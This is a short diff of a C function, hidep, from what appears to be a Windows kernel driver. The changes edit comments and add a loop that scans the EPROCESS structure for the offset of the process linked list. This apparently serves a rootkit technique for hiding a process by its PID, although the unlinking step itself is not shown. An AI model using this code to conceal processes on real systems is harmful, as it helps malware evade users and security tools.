@@ -2,12 +2,17 @@
 
 PCHAR hidep(UINT32 pid) {
 
+	
+
 	PEPROCESS currentProcess = PsGetCurrentProcess();
-	//ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440)); // (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
+	//ULONG CurrentPID = *((ULONG*)((ULONG_PTR)currentProcess + 0x440));	// 	- Would work for now, but only for the current version
+
 	ULONG CurrentPID = (ULONG)((ULONG_PTR)PsGetProcessId(currentProcess));
 
 	ULONG LIST_OFFSET = 0x0;	// Offset in PEPROCESS for the linked list
 
+	// Find the offset of the list entry, currently it's 0x448, but since it can change, this is a more sustainable way to
+	// do it
 	for (unsigned int i = 0x0; i < 0x1000; i += 0x4) {
 
 		if (CurrentPID == *(ULONG*)((UCHAR*)currentProcess + i)) {
